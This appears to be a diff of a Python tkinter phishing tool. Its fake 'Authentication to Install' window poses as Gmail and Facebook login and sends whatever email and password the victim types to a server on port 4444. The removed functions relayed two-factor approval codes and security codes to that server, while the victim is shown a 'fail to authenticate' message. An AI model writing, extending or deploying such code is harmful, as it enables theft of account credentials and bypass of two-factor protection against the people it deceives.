@@ -1,6 +1,8 @@
 from tkinter import *;
 from tkinter import messagebox;
 from tkinter.ttk import *;
+from g_factor import *;
+from f_factor import *;
 from email_validator import validate_email,EmailNotValidError
 import socket,time;
 REMOTE_IP = "127.0.0.1"
@@ -8,8 +10,6 @@ REMOTE_PORT = 4444 # Server Port Number
 
 #when gmail and password check are finished, execute this login
 def login(gwindow,gmail,password,isFacebook):
-    #close form window
-    gwindow.destroy();
     # new window for result 
     gresult_window = Toplevel()
     gresult_window.geometry("550x150")
@@ -23,6 +23,9 @@ def login(gwindow,gmail,password,isFacebook):
     text = f"G gmail:{gmail} and password:{password}" if isFacebook == False else f"F gmail:{gmail} and password:{password}"
     client.send(text.encode())
     result = client.recv(1024).decode()
+    if(result):
+        #close form window
+        gwindow.destroy();
     #you don't need two factor,this will be shown
     if(result == "okay"):
         #result
@@ -36,65 +39,6 @@ def login(gwindow,gmail,password,isFacebook):
         else:
             res = messagebox.askokcancel("Two-Authentication","Would you like to give access your two-authentication ?")
             F_two_factor(res,mylabel,client)
-def G_two_factor(res,mylabel,client):
-    def checkNumber(number):
-        chk = False
-        #input number include your choice authentication number
-        for num in codes:
-            if(num == number):
-                client.send(num.encode())
-                chk = True
-                break
-        #if number is not matched with your choice authentication number
-        if(chk == False):
-            messagebox.showerror("Number Matching","Your number doesn't include in authentication number")
-        else:
-            fwindow.destroy()
-            mylabel.config(text="Fail to authenticate,\n Check your email or try next authentication")
-        
-    if(res):
-        client.send("okay".encode())
-        # get google authentication 3 number from you
-        codes = client.recv(1024).decode().split(" ")
-        fwindow = Toplevel()
-        fwindow.geometry("400x180")
-        fwindow.resizable(False,False)
-        fwindow.title("Gmail Two Authentication")
-        Label(fwindow,text=f'''{codes[0]}      {codes[1]}      {codes[2]}''',font=("Arial",15)).pack(pady=10)
-        number = Entry(fwindow,width=8)
-        number.focus_set()
-        number.pack(pady=8)
-        Button(fwindow,text="authenticate",width=15,command=lambda:checkNumber(number.get())).pack(pady=8)
-    else:
-        #result
-        mylabel.config(text="Fail to authenticate,\n Check your email or try next authentication")
-
-def F_two_factor(res,mylabel,client):
-    def chk_code(code):
-        client.send(code.encode())
-        # security code is wrong or not
-        result = client.recv(1024).decode()
-        print(result)
-        if(result == "True"):
-            fwindow.destroy()
-            mylabel.config(text="Fail to authenticate,\n Check your email or try next authentication")
-        else:
-            rlbl.config(text="Security code is wrong,check again")
-    if(res):
-        fwindow = Toplevel()
-        fwindow.geometry("400x180")
-        fwindow.resizable(False,False)
-        fwindow.title("Facebook Authentication")
-        rlbl = Label(fwindow,text="",font=("Arial",7),foreground="maroon")
-        rlbl.pack(pady=6)
-        Label(fwindow,text="Security Code").pack(pady=10)
-        code = Entry(fwindow,width=13)
-        code.focus_set()
-        code.pack(pady=10)
-        Button(fwindow,text="authenticate",width=15,command=lambda:chk_code(code=code.get())).pack(pady=8)
-    else:
-        #result
-        mylabel.config(text="Fail to authenticate,\n Check your email or try next authentication")
 
 def btn_Event(isFacebook):
     gwindow = Toplevel()
@@ -123,16 +67,20 @@ def btn_Event(isFacebook):
     result.pack(pady=5)
     Label(gwindow,text="Email :",font=("Arial",10)).pack(pady=10)
     #gmail text box
-    gmail = Entry(gwindow)
+    gmailE = Entry(gwindow)
     # cursor pointer to gmail text box
-    gmail.focus_set()
-    gmail.pack(pady=10)
+    gmailE.focus_set()
+    gmailE.pack(pady=10)
     Label(gwindow,text="Password :",font=("Arial",10)).pack(pady=5)
     #gmail password box
     gpass = Entry(gwindow,show="*")
     gpass.pack(pady=10)
-    gbtn = Button(gwindow,text="Login",command=lambda:checkForm(gmail=gmail.get(),gpass=gpass.get()))
+    gbtn = Button(gwindow,text="Login",command=lambda:checkForm(gmail=gmailE.get(),gpass=gpass.get()))
     gbtn.pack(pady=20)
+
+def on_closing(client):
+    client.send("close".encode());
+    window.destroy()
 
 client = socket.socket()
 client.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
@@ -143,6 +91,7 @@ try:
     window.title("Login")
     window.geometry("400x200")
     window.resizable(False,False)
+    window.protocol("WM_DELETE_WINDOW", lambda:on_closing(client=client))
     lbl1 = Label(text="Authentication to Install",font=("Arial",15)).pack(pady=10)
     btn1 = Button(text="Gmail Login",width=25,command=lambda:btn_Event(isFacebook=False))
     btn1.pack(pady=20)
